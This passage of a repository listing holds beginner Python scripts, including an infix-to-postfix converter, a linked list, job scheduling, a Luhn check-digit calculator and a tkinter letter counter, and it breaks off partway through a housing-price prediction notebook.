          "type": "blob",
          "size": 0.5849609375,
          "content": "def jpeg_res(filename):\n   \"\"\"\"This function prints the resolution of the jpeg image file passed into it\"\"\"\n\n   # open image for reading in binary mode\n   with open(filename,'rb') as img_file:\n\n       # height of image (in 2 bytes) is at 164th position\n       img_file.seek(163)\n\n       # read the 2 bytes\n       a = img_file.read(2)\n\n       # calculate height\n       height = (a[0] << 8) + a[1]\n\n       # next 2 bytes is width\n       a = img_file.read(2)\n\n       # calculate width\n       width = (a[0] << 8) + a[1]\n\n   print(\"The resolution of the image is\",width,\"x\",height)\n\njpeg_res(\"img1.jpg\")\n"
        },
        {
          "name": "Industrial_developed_hangman",
          "type": "tree",
          "content": null
        },
        {
          "name": "Infix_to_Postfix.py",
          "type": "blob",
          "size": 2.7099609375,
          "content": "# Python program to convert infix expression to postfix\n\n# Class to convert the expression\nclass Conversion:\n\n    # Constructor to initialize the class variables\n    def __init__(self, capacity):\n        self.top = -1\n        self.capacity = capacity\n        # This array is used a stack\n        self.array = []\n        # Precedence setting\n        self.output = []\n        self.precedence = {\"+\": 1, \"-\": 1, \"*\": 2, \"/\": 2, \"^\": 3}\n\n    # check if the stack is empty\n    def isEmpty(self):\n        return True if self.top == -1 else False\n\n    # Return the value of the top of the stack\n    def peek(self):\n        return self.array[-1]\n\n    # Pop the element from the stack\n    def pop(self):\n        if not self.isEmpty():\n            self.top -= 1\n            return self.array.pop()\n        else:\n            return \"$\"\n\n    # Push the element to the stack\n    def push(self, op):\n        self.top += 1\n        self.array.append(op)\n\n    # A utility function to check is the given character\n    # is operand\n    def isOperand(self, ch):\n        return ch.isalpha()\n\n    # Check if the precedence of operator is strictly\n    # less than top of stack or not\n    def notGreater(self, i):\n        try:\n            a = self.precedence[i]\n            b = self.precedence[self.peek()]\n            return True if a <= b else False\n        except KeyError:\n            return False\n\n    # The main function that converts given infix expression\n    # to postfix expression\n    def infixToPostfix(self, exp):\n\n        # Iterate over the expression for conversion\n        for i in exp:\n            # If the character is an operand,\n            # add it to output\n            if self.isOperand(i):\n                self.output.append(i)\n\n            # If the character is an '(', push it to stack\n            elif i == \"(\":\n                self.push(i)\n\n            # If the scanned character is an ')', pop and\n            # output from the stack until and '(' is found\n            elif i == \")\":\n                while (not self.isEmpty()) and self.peek() != \"(\":\n                    a = self.pop()\n                    self.output.append(a)\n                if not self.isEmpty() and self.peek() != \"(\":\n                    return -1\n                else:\n                    self.pop()\n\n                # An operator is encountered\n            else:\n                while not self.isEmpty() and self.notGreater(i):\n                    self.output.append(self.pop())\n                self.push(i)\n\n            # pop all the operator from the stack\n        while not self.isEmpty():\n            self.output.append(self.pop())\n\n        print(\"\".join(self.output))\n\n\n# Driver program to test above function\nexp = \"a+b*(c^d-e)^(f+g*h)-i\"\nobj = Conversion(len(exp))\nobj.infixToPostfix(exp)\n"
        },
        {
          "name": "Insert_operation_on_Linked_List.py",
          "type": "blob",
          "size": 1.4287109375,
          "content": "class Node:\r\n    def __init__(self, data):\r\n        self.data = data\r\n        self.next = None\r\n\r\n\r\nclass Linked_List:\r\n    def __init__(self):\r\n        self.head = None\r\n\r\n    def Insert_At_Beginning(self, new_data):\r\n        new_node = Node(new_data)\r\n        new_node.next = self.head\r\n        self.head = new_node\r\n\r\n    def Insert_After(self, node, new_data):\r\n        if node is None:\r\n            return \"Alert!, Node must be in Linked List\"\r\n        new_node = Node(new_data)\r\n        new_node.next = node.next\r\n        node.next = new_node\r\n\r\n    def Insert_At_End(self, new_data):\r\n        new_node = Node(new_data)\r\n        if self.head is None:\r\n            self.head = new_node\r\n            return\r\n        current = self.head\r\n        while current.next:\r\n            current = current.next\r\n        current.next = new_node\r\n\r\n    def Display(self):\r\n        temp = self.head\r\n        while temp:\r\n            print(temp.data, \"->\", end=\" \")\r\n            temp = temp.next\r\n        print(\"None\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    L_list = Linked_List()\r\n    L_list.Insert_At_Beginning(1)\r\n    L_list.Display()\r\n    L_list.Insert_At_Beginning(2)\r\n    L_list.Display()\r\n    L_list.Insert_At_Beginning(3)\r\n    L_list.Display()\r\n    L_list.Insert_At_End(4)\r\n    L_list.Display()\r\n    L_list.Insert_At_End(5)\r\n    L_list.Display()\r\n    L_list.Insert_At_End(6)\r\n    L_list.Display()\r\n    L_list.Insert_After(L_list.head.next, 10)\r\n    L_list.Display()\r\n"
        },
        {
          "name": "JARVIS",
          "type": "tree",
          "content": null
        },
        {
          "name": "Job_scheduling.py",
          "type": "blob",
          "size": 3.7646484375,
          "content": "#!/usr/bin/env python3\n\n\"\"\"\nAuthor : Mohit Kumar\nJob Sequencing Problem implemented in python\n\"\"\"\nfrom collections import namedtuple\nfrom typing import List\n\n\nclass Scheduling:\n    def __init__(self, jobs: List[int]) -> None:\n        \"\"\"\n        Assign jobs as instance of class Scheduling\n        \"\"\"\n        self.jobs = jobs\n\n    def schedule(self, total_jobs: int, deadline: List[int]) -> List[int]:\n        \"\"\"\n        Parameteres  : total_jobs  and list of deadline of jobs\n        Returns : List of jobs_id which are profitable  and can be done before\n                  deadline\n        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])\n        >>> a.schedule( 3, [3, 4, 5])\n        [(1, 2, 20), (2, 33, 30)]\n        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])\n        >>> a.schedule( 4, [13, 2, 33, 16])\n        [(1, 2, 20), (2, 33, 30), (3, 16, 40)]\n        \"\"\"\n        self.j = [self.jobs[1]]\n        self.x = 2\n        while self.x < total_jobs:\n            self.k = self.j.copy()\n            self.k.append(self.jobs[self.x])\n            self.x += 1\n            if self.feasible(self.k, deadline):\n                self.j = self.k.copy()\n\n        return self.j\n\n    def feasible(self, profit_jobs: List[int], deadline: List[int]) -> bool:\n        \"\"\"\n        Parameters : list of current profitable jobs within deadline\n                     list of deadline of jobs\n        Returns : true if k[-1] job is profitable to us else false\n        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])\n        >>> a.feasible( [0], [2, 13, 16, 33] )\n        True\n        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])\n        >>> a.feasible([0], [2, 13, 16, 33] )\n        True\n        \"\"\"\n\n        self.tmp = profit_jobs\n        self.is_feasible = True\n\n        i = 0\n        j = 1\n        k = 0\n\n        while i < len(self.tmp):\n            while j < len(self.tmp):\n                self.index1 = self.jobs.index(self.tmp[i])\n                self.index2 = self.jobs.index(self.tmp[j])\n                j += 1\n                if deadline[self.index1] > deadline[self.index2]:\n                    (self.tmp[i], self.tmp[j]) = (\n                        self.tmp[j],\n                        self.tmp[i],\n                    )\n            i += 1\n\n        while k < len(self.tmp):\n            self.job = self.tmp[k]\n            if self.job in self.jobs:\n                self.jobindex = self.jobs.index(self.job)\n            else:\n                self.jobindex = 0\n            self.dlineval = deadline[self.jobindex]\n            self.ftest = k + 1\n            k += 1\n            if self.dlineval < self.ftest:\n                self.is_feasible = False\n                break\n        return self.is_feasible\n\n\ndef main():\n    job = namedtuple(\"job\", \"job_id deadline profit\")\n    jobs = [\n        job(0, 0, 0),\n        job(1, 2, 46),\n        job(2, 4, 52),\n        job(3, 3, 30),\n        job(4, 3, 36),\n        job(5, 2, 56),\n        job(6, 1, 40),\n    ]\n    # midresult stores jobs in sorting order of deadline\n    midresult = []\n    for i in range(len(jobs)):\n        current_job = []\n        current_job.extend((jobs[i].deadline, jobs[i].profit, jobs[i].job_id))\n        midresult.append(current_job)\n    midresult.sort(key=lambda k: (k[0], -k[1]))\n    (deadline, profit, jobs) = map(list, zip(*midresult))\n\n    scheduling_jobs = Scheduling(jobs)\n    scheduled_jobs = scheduling_jobs.schedule(len(jobs), deadline)\n    print(f\"\\n Jobs {scheduled_jobs}\")\n\n    finalprofit = []\n    finaldl = []\n\n    for i, item in enumerate(scheduled_jobs):\n        jobsindex = jobs.index(item)\n        finalprofit.append(profit[jobsindex])\n        finaldl.append(deadline[jobsindex])\n\n    print(f\"\\n Profit {finalprofit}\")\n    print(f\"\\n Deadline {finaldl}\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "JsonParser.py",
          "type": "blob",
          "size": 1.41796875,
          "content": "import json\n\n\nclass JsonParser:\n    \"\"\"\n    this class to handle anything related to json file [as implementation of facade pattern]\n    \"\"\"\n\n    def convert_json_to_python(self, par_json_file):\n        \"\"\"\n        this function to convert any json file format to dictionary\n        args: the json file\n        return: dictionary contains json file data\n        \"\"\"\n        with open(par_json_file) as json_file:\n            data_dic = json.load(json_file)\n        return data_dic\n\n    def convert_python_to_json(self, par_data_dic, par_json_file=\"\"):\n        \"\"\"\n        this function converts dictionary of data to json string and store it in json file if\n        json file pass provided if not it only returns the json string\n        args:\n             par_data_dic: dictionary of data\n             par_json_file: the output json file\n        return: json string\n        \"\"\"\n        if par_json_file:\n            with open(par_json_file, \"w\") as outfile:\n                return json.dump(par_data_dic, outfile)\n        else:\n            return json.dump(par_data_dic)\n\n    def get_json_value(self, par_value, par_json_file):\n        \"\"\"\n        this function gets specific dictionary key value from json file\n        args:\n             par_value: dictionary key value\n             par_json_file: json file\n             return: value result\n        \"\"\"\n        data_dic = self.convert_json_to_python(par_json_file)\n        return data_dic[par_value]\n"
        },
        {
          "name": "JustDialScrapperGUI",
          "type": "tree",
          "content": null
        },
        {
          "name": "Key_Binding",
          "type": "tree",
          "content": null
        },
        {
          "name": "Kilometerstomile.py",
          "type": "blob",
          "size": 0.2490234375,
          "content": "# Taking kilometers input from the user\nkilometers = float(input(\"Enter value in kilometers: \"))\n\n# conversion factor\nconv_fac = 0.621371\n\n# calculate miles\nmiles = kilometers * conv_fac\nprint(f'{kilometers:.2f} kilometers is equal to {miles:.2f} miles')\n"
        },
        {
          "name": "Koch Curve",
          "type": "tree",
          "content": null
        },
        {
          "name": "LETTER GUESSER",
          "type": "blob",
          "size": 0.55859375,
          "content": "import random\nimport string\n\nABCS = string.ascii_lowercase\nABCS = list(ABCS)\n\nplay = True\n\ncompChosse = random.choice(ABCS)\n\nprint(\":guess the letter (only 10 guesses):\")\nuserInput = input(\"guess:\")\n\nfailed = 10\n\nwhile failed > 0:\n\tif userInput == compChosse:\n\t\tprint(\"---------->\")\n\t\tprint(\"You are correct!\")\n\t\tprint(\"---------->\")\n\t\tprint(\"Your guesses: \" + str(10 - failed))\n\t\tbreak\n\n\telif userInput != compChosse:\n\t\tfailed = failed - 1\n\t\n\t\tprint(\":no your wrong: \" + \"left: \" + str(failed))\n\t\n\t\tuserInput = input(\"guess:\")\n\n\tif failed == 0:\n\t\tprint(\"out of guesses\")\n"
        },
        {
          "name": "LICENSE.md",
          "type": "blob",
          "size": 1.0458984375,
          "content": "MIT License\n\nCopyright (c) 2018 Craig Richards\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "Laundary System",
          "type": "tree",
          "content": null
        },
        {
          "name": "Letter_Counter.py",
          "type": "blob",
          "size": 1.4404296875,
          "content": "import tkinter as tk\n\nroot = tk.Tk()\nroot.geometry(\"400x260+50+50\")\nroot.title(\"Welcome to Letter Counter App\")\nmessage1 = tk.StringVar()\nLetter1 = tk.StringVar()\n\n\ndef printt():\n    message = message1.get()\n    letter = Letter1.get()\n    message = message.lower()\n    letter = letter.lower()\n\n    # Get the count and display results.\n    letter_count = message.count(letter)\n    a = \"your message has \" + str(letter_count) + \" \" + letter + \"'s in it.\"\n    labl = tk.Label(root, text=a, font=(\"arial\", 15), fg=\"black\").place(x=10, y=220)\n\n\nlbl = tk.Label(root, text=\"Enter the Message--\", font=(\"Ubuntu\", 15), fg=\"black\").place(\n    x=10, y=10\n)\nlbl1 = tk.Label(\n    root, text=\"Enter the Letter you want to count--\", font=(\"Ubuntu\", 15), fg=\"black\"\n).place(x=10, y=80)\nE1 = tk.Entry(\n    root, font=(\"arial\", 15), textvariable=message1, bg=\"white\", fg=\"black\"\n).place(x=10, y=40, height=40, width=340)\nE2 = tk.Entry(\n    root, font=(\"arial\", 15), textvariable=Letter1, bg=\"white\", fg=\"black\"\n).place(x=10, y=120, height=40, width=340)\nbut = tk.Button(\n    root,\n    text=\"Check\",\n    command=printt,\n    cursor=\"hand2\",\n    font=(\"Times new roman\", 30),\n    fg=\"white\",\n    bg=\"black\",\n).place(x=10, y=170, height=40, width=380)\n# print(\"In this app, I will count the number of times that a specific letter occurs in a message.\")\n# message = input(\"\\nPlease enter a message: \")\n# letter = input(\"Which letter would you like to count the occurrences of?: \")\n\nroot.mainloop()\n"
        },
        {
          "name": "List.py",
          "type": "blob",
          "size": 0.591796875,
          "content": "List = []\r\n# List is Muteable\r\n# means value can be change\r\nList.insert(0, 5) #insertion takes place at mentioned index\r\nList.insert(1, 10) \r\nList.insert(0, 6)\r\nprint(List)\r\nList.remove(6) \r\nList.append(9) #insertion takes place at last \r\nList.append(1)\r\nList.sort()    #arranges element in ascending order\r\nprint(List)\r\nList.pop()\r\nList.reverse()\r\nprint(List)\r\n\"\"\"\r\nList.append(1)\r\nprint(List)\r\nList.append(2)\r\nprint(List)\r\nList.insert(1 , 3)\r\nprint(List)\r\n\"\"\"\r\n\r\nlist2 = [2, 3, 7, 5, 10, 17, 12, 4, 1, 13]\r\nfor i in list2:\r\n    if i % 2 == 0:\r\n        print(i)\r\n\"\"\"\r\nExpected Output:\r\n2\r\n10\r\n12\r\n4\r\n\"\"\"\r\n"
        },
        {
          "name": "Luhn_Algorithm.py",
          "type": "blob",
          "size": 1.9697265625,
          "content": "#!/usr/bin/env python3\r\n\r\n\"\"\"\r\nPython Program using the Luhn Algorithm\r\n\r\nThis program uses the Luhn Algorithm, named after its creator\r\nHans Peter Luhn, to calculate the check digit of a 10-digit\r\n\"payload\" number, and output the final 11-digit number.\r\n\r\nTo prove this program correctly calculates the check digit,\r\nthe input 7992739871 should return:\r\n\r\nSum of all digits: 67\r\nCheck digit: 3\r\nFull valid number (11 digits): 79927398713\r\n\r\n11/15/2021\r\nDavid Costell (DontEatThemCookies on GitHub)\r\n\"\"\"\r\n\r\n# Input\r\nCC = input(\"Enter number to validate (e.g. 7992739871): \")\r\nif len(CC) < 10 or len(CC) > 10:\r\n    input(\"Number must be 10 digits! \")\r\n    exit()\r\n\r\n# Use list comprehension to split the number into individual digits\r\nsplit = [int(split) for split in str(CC)]\r\n\r\n# List of digits to be multiplied by 2 (to be doubled)\r\ntobedoubled = [split[1], split[3], split[5], split[7], split[9]]\r\n# List of remaining digits not to be multiplied\r\nremaining = [split[0], split[2], split[4], split[6], split[8]]\r\n\r\n# Step 1\r\n# Double all values in the tobedoubled list\r\n# Put the newly-doubled values in a new list\r\nnewdoubled = []\r\nfor i in tobedoubled:\r\n    i = i * 2\r\n    newdoubled.append(i)\r\ntobedoubled = newdoubled\r\n\r\n# Check for any double-digit items in the tobedoubled list\r\n# Splits all double-digit items into two single-digit items\r\nnewdoubled = []\r\nfor i in tobedoubled:\r\n    if i > 9:\r\n        splitdigit = str(i)\r\n        for index in range(0, len(splitdigit), 1):\r\n            newdoubled.append(splitdigit[index : index + 1])\r\n        tobedoubled.remove(i)\r\nnewdoubled = [int(i) for i in newdoubled]\r\n\r\n# Unify all lists into one (luhnsum)\r\nluhnsum = []\r\nluhnsum.extend(tobedoubled)\r\nluhnsum.extend(newdoubled)\r\nluhnsum.extend(remaining)\r\n\r\n# Output\r\nprint(\"Final digit list:\", luhnsum)\r\nprint(\"Sum of all digits:\", sum(luhnsum))\r\ncheckdigit = 10 - sum(luhnsum) % 10\r\nprint(\"Check digit:\", checkdigit)\r\nfinalcc = str(CC) + str(checkdigit)\r\nprint(\"Full valid number (11 digits):\", finalcc)\r\ninput()\r\n"
        },
        {
          "name": "ML House Prediction.ipynb",
          "type": "blob",
          "size": 266.7529296875,
          "content": "{\n \"cells\": [\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"## Housing Price Predictor\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 1,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"import pandas as pd\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 2,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"housing= pd.read_csv(\\\"data.csv\\\")\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 3,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/html\": [\n       \"<div>\\n\",\n       \"<style scoped>\\n\",\n       \"    .dataframe tbody tr th:only-of-type {\\n\",\n       \"        vertical-align: middle;\\n\",\n       \"    }\\n\",\n       \"\\n\",\n       \"    .dataframe tbody tr th {\\n\",\n       \"        vertical-align: top;\\n\",\n       \"    }\\n\",\n       \"\\n\",\n       \"    .dataframe thead th {\\n\",\n       \"        text-align: right;\\n\",\n       \"    }\\n\",\n       \"</style>\\n\",\n       \"<table border=\\\"1\\\" class=\\\"dataframe\\\">\\n\",\n       \"  <thead>\\n\",\n       \"    <tr style=\\\"text-align: right;\\\">\\n\",\n       \"      <th></th>\\n\",\n       \"      <th>CRIM</th>\\n\",\n       \"      <th>ZN</th>\\n\",\n       \"      <th>INDUS</th>\\n\",\n       \"      <th>CHAS</th>\\n\",\n       \"      <th>NOX</th>\\n\",\n       \"      <th>RM</th>\\n\",\n       \"      <th>AGE</th>\\n\",\n       \"      <th>DIS</th>\\n\",\n       \"      <th>RAD</th>\\n\",\n       \"      <th>TAX</th>\\n\",\n       \"      <th>PTRATIO</th>\\n\",\n       \"      <th>B</th>\\n\",\n       \"      <th>LSTAT</th>\\n\",\n       \"      <th>MEDV</th>\\n\",\n       \"    </tr>\\n\",\n       \"  </thead>\\n\",\n       \"  <tbody>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>0</th>\\n\",\n       \"      <td>0.00632</td>\\n\",\n       \"      <td>18.0</td>\\n\",\n       \"      <td>2.31</td>\\n\",\n       \"      <td>0</td>\\n\",\n       \"      <td>0.538</td>\\n\",\n       \"      <td>6.575</td>\\n\",\n       \"      <td>65.2</td>\\n\",\n       \"      <td>4.0900</td>\\n\",\n       \"      <td>1</td>\\n\",\n       \"      <td>296</td>\\n\",\n       \"      <td>15.3</td>\\n\",\n       \"      <td>396.90</td>\\n\",\n       \"      <td>4.98</td>\\n\",\n       \"      <td>24.0</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>1</th>\\n\",\n       \"      <td>0.02731</td>\\n\",\n       \"      <td>0.0</td>\\n\",\n       \"      <td>7.07</td>\\n\",\n       \"      <td>0</td>\\n\",\n       \"      <td>0.469</td>\\n\",\n       \"      <td>6.421</td>\\n\",\n       \"      <td>78.9</td>\\n\",\n       \"      <td>4.9671</td>\\n\",\n       \"      <td>2</td>\\n\",\n       \"      <td>242</td>\\n\",\n       \"      <td>17.8</td>\\n\",\n       \"      <td>396.90</td>\\n\",\n       \"      <td>9.14</td>\\n\",\n       \"      <td>21.6</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>2</th>\\n\",\n       \"      <td>0.02729</td>\\n\",\n       \"      <td>0.0</td>\\n\",\n       \"      <td>7.07</td>\\n\",\n       \"      <td>0</td>\\n\",\n       \"      <td>0.469</td>\\n\",\n       \"      <td>7.185</td>\\n\",\n       \"      <td>61.1</td>\\n\",\n       \"      <td>4.9671</td>\\n\",\n       \"      <td>2</td>\\n\",\n       \"      <td>242</td>\\n\",\n       \"      <td>17.8</td>\\n\",\n       \"      <td>392.83</td>\\n\",\n       \"      <td>4.03</td>\\n\",\n       \"      <td>34.7</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>3</th>\\n\",\n       \"      <td>0.03237</td>\\n\",\n       \"      <td>0.0</td>\\n\",\n       \"      <td>2.18</td>\\n\",\n       \"      <td>0</td>\\n\",\n       \"      <td>0.458</td>\\n\",\n       \"      <td>6.998</td>\\n\",\n       \"      <td>45.8</td>\\n\",\n       \"      <td>6.0622</td>\\n\",\n       \"      <td>3</td>\\n\",\n       \"      <td>222</td>\\n\",\n       \"      <td>18.7</td>\\n\",\n       \"      <td>394.63</td>\\n\",\n       \"      <td>2.94</td>\\n\",\n       \"      <td>33.4</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>4</th>\\n\",\n       \"      <td>0.06905</td>\\n\",\n       \"      <td>0.0</td>\\n\",\n       \"      <td>2.18</td>\\n\",\n       \"      <td>0</td>\\n\",\n       \"      <td>0.458</td>\\n\",\n       \"      <td>7.147</td>\\n\",\n       \"      <td>54.2</td>\\n\",\n       \"      <td>6.0622</td>\\n\",\n       \"      <td>3</td>\\n\",\n       \"      <td>222</td>\\n\",\n       \"      <td>18.7</td>\\n\",\n       \"      <td>396.90</td>\\n\",\n       \"      <td>5.33</td>\\n\",\n       \"      <td>36.2</td>\\n\",\n       \"    </tr>\\n\",\n       \"  </tbody>\\n\",\n       \"</table>\\n\",\n       \"</div>\"\n      ],\n      \"text/plain\": [\n       \"     CRIM     ZN  INDUS  CHAS    NOX     RM   AGE     DIS  RAD  TAX  PTRATIO  \\\\\\n\",\n       \"0  0.00632  18.0   2.31     0  0.538  6.575  65.2  4.0900    1  296     15.3   \\n\",\n       \"1  0.02731   0.0   7.07     0  0.469  6.421  78.9  4.9671    2  242     17.8   \\n\",\n       \"2  0.02729   0.0   7.07     0  0.469  7.185  61.1  4.9671    2  242     17.8   \\n\",\n       \"3  0.03237   0.0   2.18     0  0.458  6.998  45.8  6.0622    3  222     18.7   \\n\",\n       \"4  0.06905   0.0   2.18     0  0.458  7.147  54.2  6.0622    3  222     18.7   \\n\",\n       \"\\n\",\n       \"        B  LSTAT  MEDV  \\n\",\n       \"0  396.90   4.98  24.0  \\n\",\n       \"1  396.90   9.14  21.6  \\n\",\n       \"2  392.83   4.03  34.7  \\n\",\n       \"3  394.63   2.94  33.4  \\n\",\n       \"4  396.90   5.33  36.2  \"\n      ]\n     },\n     \"execution_count\": 3,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"housing.head()\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 4,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"name\": \"stdout\",\n     \"output_type\": \"stream\",\n     \"text\": [\n      \"<class 'pandas.core.frame.DataFrame'>\\n\",\n      \"RangeIndex: 506 entries, 0 to 505\\n\",\n      \"Data columns (total 14 columns):\\n\",\n      \" #   Column   Non-Null Count  Dtype  \\n\",\n      \"---  ------   --------------  -----  \\n\",\n      \" 0   CRIM     506 non-null    float64\\n\",\n      \" 1   ZN       506 non-null    float64\\n\",\n      \" 2   INDUS    506 non-null    float64\\n\",\n      \" 3   CHAS     506 non-null    int64  \\n\",\n      \" 4   NOX      506 non-null    float64\\n\",\n      \" 5   RM       506 non-null    float64\\n\",\n      \" 6   AGE      506 non-null    float64\\n\",\n      \" 7   DIS      506 non-null    float64\\n\",\n      \" 8   RAD      506 non-null    int64  \\n\",\n      \" 9   TAX      506 non-null    int64  \\n\",\n      \" 10  PTRATIO  506 non-null    float64\\n\",\n      \" 11  B        506 non-null    float64\\n\",\n      \" 12  LSTAT    506 non-null    float64\\n\",\n      \" 13  MEDV     506 non-null    float64\\n\",\n      \"dtypes: float64(11), int64(3)\\n\",\n      \"memory usage: 55.4 KB\\n\"\n     ]\n    }\n   ],\n   \"source\": [\n    \"housing.info()\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 5,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/html\": [\n       \"<div>\\n\",\n       \"<style scoped>\\n\",\n       \"    .dataframe tbody tr th:only-of-type {\\n\",\n       \"        vertical-align: middle;\\n\",\n       \"    }\\n\",\n       \"\\n\",\n       \"    .dataframe tbody tr th {\\n\",\n       \"        vertical-align: top;\\n\",\n       \"    }\\n\",\n       \"\\n\",\n       \"    .dataframe thead th {\\n\",\n       \"        text-align: right;\\n\",\n       \"    }\\n\",\n       \"</style>\\n\",\n       \"<table border=\\\"1\\\" class=\\\"dataframe\\\">\\n\",\n       \"  <thead>\\n\",\n       \"    <tr style=\\\"text-align: right;\\\">\\n\",\n       \"      <th></th>\\n\",\n       \"      <th>CRIM</th>\\n\",\n       \"      <th>ZN</th>\\n\",\n       \"      <th>INDUS</th>\\n\",\n       \"      <th>CHAS</th>\\n\",\n       \"      <th>NOX</th>\\n\",\n       \"      <th>RM</th>\\n\",\n       \"      <th>AGE</th>\\n\",\n       \"      <th>DIS</th>\\n\",\n       \"      <th>RAD</th>\\n\",\n       \"      <th>TAX</th>\\n\",\n       \"      <th>PTRATIO</th>\\n\",\n       \"      <th>B</th>\\n\",\n       \"      <th>LSTAT</th>\\n\",\n       \"      <th>MEDV</th>\\n\",\n       \"    </tr>\\n\",\n       \"  </thead>\\n\",\n       \"  <tbody>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>count</th>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"      <td>506.000000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>mean</th>\\n\",\n       \"      <td>3.613524</td>\\n\",\n       \"      <td>11.363636</td>\\n\",\n       \"      <td>11.136779</td>\\n\",\n       \"      <td>0.069170</td>\\n\",\n       \"      <td>0.554695</td>\\n\",\n       \"      <td>6.284634</td>\\n\",\n       \"      <td>68.574901</td>\\n\",\n       \"      <td>3.795043</td>\\n\",\n       \"      <td>9.549407</td>\\n\",\n       \"      <td>408.237154</td>\\n\",\n       \"      <td>18.455534</td>\\n\",\n       \"      <td>356.674032</td>\\n\",\n       \"      <td>12.653063</td>\\n\",\n       \"      <td>22.532806</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>std</th>\\n\",\n       \"      <td>8.601545</td>\\n\",\n       \"      <td>23.322453</td>\\n\",\n       \"      <td>6.860353</td>\\n\",\n       \"      <td>0.253994</td>\\n\",\n       \"      <td>0.115878</td>\\n\",\n       \"      <td>0.702617</td>\\n\",\n       \"      <td>28.148861</td>\\n\",\n       \"      <td>2.105710</td>\\n\",\n       \"      <td>8.707259</td>\\n\",\n       \"      <td>168.537116</td>\\n\",\n       \"      <td>2.164946</td>\\n\",\n       \"      <td>91.294864</td>\\n\",\n       \"      <td>7.141062</td>\\n\",\n       \"      <td>9.197104</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>min</th>\\n\",\n       \"      <td>0.006320</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.460000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.385000</td>\\n\",\n       \"      <td>3.561000</td>\\n\",\n       \"      <td>2.900000</td>\\n\",\n       \"      <td>1.129600</td>\\n\",\n       \"      <td>1.000000</td>\\n\",\n       \"      <td>187.000000</td>\\n\",\n       \"      <td>12.600000</td>\\n\",\n       \"      <td>0.320000</td>\\n\",\n       \"      <td>1.730000</td>\\n\",\n       \"      <td>5.000000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>25%</th>\\n\",\n       \"      <td>0.082045</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>5.190000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.449000</td>\\n\",\n       \"      <td>5.885500</td>\\n\",\n       \"      <td>45.025000</td>\\n\",\n       \"      <td>2.100175</td>\\n\",\n       \"      <td>4.000000</td>\\n\",\n       \"      <td>279.000000</td>\\n\",\n       \"      <td>17.400000</td>\\n\",\n       \"      <td>375.377500</td>\\n\",\n       \"      <td>6.950000</td>\\n\",\n       \"      <td>17.025000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>50%</th>\\n\",\n       \"      <td>0.256510</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>9.690000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"  